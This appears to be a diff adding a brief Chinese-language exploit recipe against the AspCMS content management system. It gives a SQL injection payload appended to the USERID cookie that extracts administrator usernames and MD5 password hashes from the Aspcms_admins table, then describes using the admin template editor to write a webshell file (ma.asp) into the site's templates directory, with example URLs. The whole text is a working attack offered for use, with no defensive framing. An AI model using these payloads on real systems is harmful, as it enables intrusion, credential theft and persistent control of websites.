@@ -1,0 +1,16 @@
+注册一个帐号。然后登陆后修改COOKIES的USERID值
+
+在后面加上注入语句:
+
+UNION SELECT 1,2,3,4,5,6,username,adminpassword,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from Aspcms_admins 
+
+然后编辑帐号就能看到管理员的帐号和MD5密码值。
+
+后台拿SHELL：
+
+访问http://www.shitsec.com/admin/_Style/AspCms_TemplateEdit.asp?filename=ma.asp在里面加一句话或者大马。
+
+保存后SHELL在风格目录下面。http://www.shitsec.com/Templates/default/html/ma.asp
+
+
+
